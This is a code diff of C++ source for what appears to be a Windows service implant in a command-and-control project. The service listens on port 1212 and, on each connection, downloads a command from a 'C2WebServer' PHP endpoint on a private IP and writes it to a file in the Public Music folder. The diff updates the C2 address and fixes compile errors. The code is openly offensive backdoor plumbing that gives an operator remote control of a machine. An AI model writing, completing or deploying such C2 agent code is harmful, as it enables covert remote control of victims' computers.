@@ -34,21 +34,14 @@ std::string GetURLContent(const char* url) {
     return content;
 }
 
-VOID WINAPI RequestHandler(LPVOID lpParam) {
+DWORD WINAPI RequestHandler(LPVOID lpParam) {
     SOCKET clientSocket = (SOCKET)lpParam;
 
-    // Aquí colocas el código que deseas ejecutar cuando se reciba una petición en el servidor de Windows.
-    // Por ejemplo, puedes realizar una lectura de datos recibidos en el socket y realizar una acción en base a esos datos.
-    // Recuerda cerrar el socket al finalizar el manejo de la petición.
-
-    // Ejemplo de recepción de datos:
     char buffer[4096];
     int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);
 
     if (bytesRead > 0) {
-        // Realiza alguna acción basada en los datos recibidos en el buffer.
-
-        const char* url = "http://192.168.0.135/C2WebServer/controller/sendCommand.php";
+        const char* url = "http://10.231.221.222/C2WebServer/controller/sendCommand.php";
         std::string urlContent = GetURLContent(url);
         std::ofstream file("C:\\Users\\Public\\Music\\command.txt");
         file << urlContent;
@@ -57,6 +50,7 @@ VOID WINAPI RequestHandler(LPVOID lpParam) {
     }
 
     closesocket(clientSocket);
+    return 0;  // Return a DWORD value
 }
 
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
@@ -67,8 +61,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
 
     SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (listenSocket == INVALID_SOCKET) {
-        // Error al crear el socket
-        WSACleanup();  // Limpiar Winsock
+        WSACleanup();
         return;
     }
 
@@ -78,40 +71,33 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
     service.sin_port = htons(1212);
 
     if (bind(listenSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
-        // Error al vincular el socket
         closesocket(listenSocket);
-        WSACleanup();  // Limpiar Winsock
+        WSACleanup();
         return;
     }
 
     if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
-        // Error al escuchar en el socket
         closesocket(listenSocket);
-        WSACleanup();  // Limpiar Winsock
+        WSACleanup();
         return;
     }
 
     while (true) {
         SOCKET clientSocket = accept(listenSocket, NULL, NULL);
         if (clientSocket == INVALID_SOCKET) {
-            // Error al aceptar la conexión
             continue;
         }
 
-        // Crear un nuevo hilo para manejar la petición
         DWORD threadId;
         HANDLE threadHandle = CreateThread(NULL, 0, RequestHandler, (LPVOID)clientSocket, 0, &threadId);
         if (threadHandle == NULL) {
-            // Error al crear el hilo
             closesocket(clientSocket);
             continue;
         }
 
-        // Cerrar el handle del hilo, ya que no lo necesitamos
         CloseHandle(threadHandle);
     }
 
-    // Cerrar el socket y limpiar Winsock
     closesocket(listenSocket);
     WSACleanup();
 }
@@ -119,7 +105,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
 int main(int argc, char* argv[]) {
     SERVICE_TABLE_ENTRY serviceTable[] =
     {
-        { SERVICE_NAME, ServiceMain },
+        { (LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
         { nullptr, nullptr }
     };
 
